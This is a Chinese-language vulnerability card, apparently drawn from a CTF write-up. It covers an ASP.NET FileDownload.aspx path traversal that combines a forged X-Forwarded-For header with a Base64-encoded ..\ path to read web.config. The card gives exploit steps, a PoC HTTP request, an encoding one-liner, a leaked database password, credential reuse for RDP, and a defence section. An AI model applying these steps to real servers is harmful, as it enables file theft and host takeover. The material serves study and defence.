---
id: web-generic-file-inclusion-aspnet-filedownload-xff-base64-traversal
title: ASP.NET FileDownload.aspx：README 泄露源码 → XFF 伪造 + Base64 路径穿越读取 web.config 凭据
type: scenario
domain: web
path: web/generic/file-inclusion
technique: aspnet-filedownload-xff-base64-path-traversal
aliases:
- FileDownload.aspx 任意文件读取
- X-Forwarded-For 127.0.0.1 绕过
- Base64 文件名路径穿越
- Path.Combine StartsWith 绕过
- web.config 数据库口令泄露
- README.txt 源码泄露
tags:
- aspnet
- iis
- csharp
- file-download
- path-traversal
- backslash
- base64
- x-forwarded-for
- web-config
- credential-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V247
  verified_at: '2026-11-07T12:39:40+08:00'
  notes: 已对照原文核对：README.txt 泄露的 FileDownload.aspx 源码确为 XFF contains 127.0.0.1 + Base64 img + Path.Combine + StartsWith 前缀校验；PoC 路径 ..\..\..\Users\Administrator\Desktop\flag 的 Base64 与截图一致，web.config 连接串 root:KyHbPqxA3tD8oj17yC 一致；无版本/CVE。未验证点：未复跑请求；截图中的 flag 文件内容含“错啦”疑为诱饵，最终主机登录仅有文字叙述；frontmatter 无 sources/source_url。
---

## 一句话结论

ASP.NET 站点的 `README.txt` 泄露了 `FileDownload.aspx` 源码：页面用 `Request.Headers["X-Forwarded-For"]` 是否包含 `127.0.0.1` 做访问控制，再把 `img` 参数 Base64 解码成文件名，`Path.Combine(baseDirectory, fileName)` 后只用 `filePath.StartsWith(baseDirectory)` 校验；攻击者伪造 `X-Forwarded-For: 127.0.0.1`，提交 Base64(`..\..\..\Users\Administrator\Desktop\flag`) 即可绕过校验读取任意文件；同法读取 `web.config` 得到 SQL Server `root` 口令，再用该口令 RDP 登录 Windows 主机。

## 原理

- **源码泄露**：站点根目录残留 `README.txt`，内容就是 `FileDownload.aspx` 的 C# 源码，攻击者无需逆向即可看到鉴权与路径拼接逻辑。
- **XFF 信任**：代码 `string forwardedFor = Request.Headers["X-Forwarded-For"]; if (string.IsNullOrEmpty(forwardedFor) || !forwardedFor.Contains("127.0.0.1")) return;` 完全信任客户端可伪造的 `X-Forwarded-For`；只要请求头包含 `127.0.0.1` 就通过，未校验真实来源 IP，也未检查代理链。
- **Base64 不是安全边界**：`img` 参数做 `Convert.FromBase64String` 后 `Encoding.UTF8.GetString`，Base64 只是编码；攻击者可以编码任意路径，服务端不会因为编码而拦截。
- **`Path.Combine` + `StartsWith` 的路径穿越**：`baseDirectory = Server.MapPath("~/")`，`filePath = Path.Combine(baseDirectory, fileName)`。当 `fileName = "..\..\..\Users\Administrator\Desktop\flag"` 时，`filePath` 是 `C:\inetpub\wwwroot\..\..\..\Users\Administrator\Desktop\flag`；字符串仍然以 `baseDirectory` 开头，`filePath.StartsWith(baseDirectory, OrdinalIgnoreCase)` 返回 true，但 `File.Exists`/`WriteFile` 会按 `..` 解析到 Web 根之外。正确做法应先 `Path.GetFullPath` 规范化，再检查结果是否位于 `baseDirectory` 之内。
- **web.config 凭据**：`web.config` 的 `<connectionStrings>` 含 `Server=...;Database=...;Uid=root;Password=...`，应用池账号对站点目录有读权限，因此同法可读；泄露的 `root` 口令复用到 Windows RDP 登录，完成从 Web 文件读取到主机接管。
- **影响链**：任意文件读取 → 读 flag/配置文件 → 数据库口令 → RDP/主机登录；即使没有 RDP，数据库口令也可直连数据库拖数据。

## 触发条件

- ASP.NET/IIS 站点存在 `FileDownload.aspx`（或同类下载页），且 `README.txt`/源码文件可访问。
- 页面用 `X-Forwarded-For` 等客户端头做 localhost 信任，且未被前置代理覆盖/清洗。
- `img` 等参数把 Base64 解码结果直接拼进 `Path.Combine`，只用 `StartsWith` 等字符串前缀校验，未做 `GetFullPath` 规范化。
- 应用池账号对目标文件（flag、`web.config`、其他站点文件）有读权限。
- `web.config` 中存在可复用的数据库/主机凭据，且目标开放 RDP/数据库端口（可选，决定最终危害）。

## 利用步骤

1. 访问站点根目录的 `README.txt`（或 `readme.txt`/备份文件），拿到 `FileDownload.aspx` 源码，确认 XFF 检查与 Base64 文件名逻辑。
2. 构造 `X-Forwarded-For: 127.0.0.1`（若前面有代理，尝试 `X-Forwarded-For: 127.0.0.1, <真实IP>` 或多次 XFF 头，观察哪个值被 `.Contains` 命中）。
3. 把目标路径做 UTF-8 + Base64：
   - `..\..\..\Users\Administrator\Desktop\flag` → `Li5cLi5cLi5cVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXGZsYWc=`
   - `..\..\..\web.config` → 对应 Base64
4. 请求 `GET /FileDownload.aspx?img=<Base64>`，带 XFF 头；响应以 `image/jpeg`/attachment 返回文件内容。
5. 读取 flag；再用同法读取 `web.config`，从 `<connectionStrings>` 提取 `Server`、`Database`、`Uid`、`Password`。
6. 用泄露的 `root` 口令尝试 RDP/其他服务登录 Windows 主机；或直连 SQL Server 读取数据。

## PoC

```http
GET /FileDownload.aspx?img=Li5cLi5cLi5cVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXGZsYWc= HTTP/1.1
Host: target
X-Forwarded-For: 127.0.0.1
```

```bash
# 生成任意路径的 Base64（Windows 反斜杠）
python -c "import base64; print(base64.b64encode(r'..\..\..\web.config'.encode()).decode())"
```

读取 `web.config` 后可见：

```xml
<connectionStrings>
  <add name="Conn"
       connectionString="Server=192.168.99.51;Database=ctfsec;Uid=root;Password=KyHbPqxA3tD8oj17yC;MultipleActiveResultSets=true"
       providerName="System.Data.SqlClient" />
</connectionStrings>
```

## 变体与关联

- 与库内“Windows 下载接口只替换正斜杠，反斜杠 ..\ 穿越读取任意文件”卡属同一类 Windows 反斜杠穿越，但本卡是 ASP.NET `Path.Combine` + `StartsWith` 前缀校验失效，额外有 `X-Forwarded-For` 伪造与 Base64 文件名包装，触发条件和 PoC 明显不同。
- 若 `X-Forwarded-For` 被代理覆盖，可尝试 `X-Real-IP`、`Forwarded`、`X-Client-IP` 等头，或从代理链中找包含 `127.0.0.1` 的值。
- 若 `Path.Combine` 的第二个参数是绝对路径（如 `C:\...` 或 `\\server\share`），`Combine` 会直接返回第二个路径，`StartsWith(baseDirectory)` 通常失败；本卡的 `..\` 相对路径才是绕过点。
- 读取目标可扩展到 `web.config`、`appsettings.json`、`connectionStrings.config`、IIS 日志、其他站点目录、用户桌面/文档等。

## 检测与防御

- **路径规范化**：用 `Path.GetFullPath(Path.Combine(baseDirectory, fileName))` 后检查 `fullPath.StartsWith(baseDirectory + Path.DirectorySeparatorChar, OrdinalIgnoreCase)`；拒绝含 `..`、绝对路径、UNC 路径的输入；最好用文件 ID/白名单映射。
- **不要信任 XFF**：不要用 `X-Forwarded-For` 做访问控制；如需本地访问限制，校验 `Request.UserHostAddress` 或由可信代理注入并清洗头。
- **移除源码/README**：部署时删除 `README.txt`、`.cs`、`.bak`、`.zip` 等源码/备份文件；关闭目录浏览。
- **保护配置**：`web.config` 最小权限；连接字符串使用集成认证/最小权限账号；不要把 `root`/`sa` 口令写入 Web 配置。
- **检测**：监控 `FileDownload.aspx?img=` 中异常长的 Base64、`X-Forwarded-For` 含 `127.0.0.1` 的外部请求、响应类型 `image/jpeg` 但路径指向配置文件；审计 IIS 日志中的 `..`/`%5c` 编码。
- **应急**：一旦确认泄露，立即轮换数据库口令、限制 RDP 来源、检查主机登录日志与数据库访问日志。
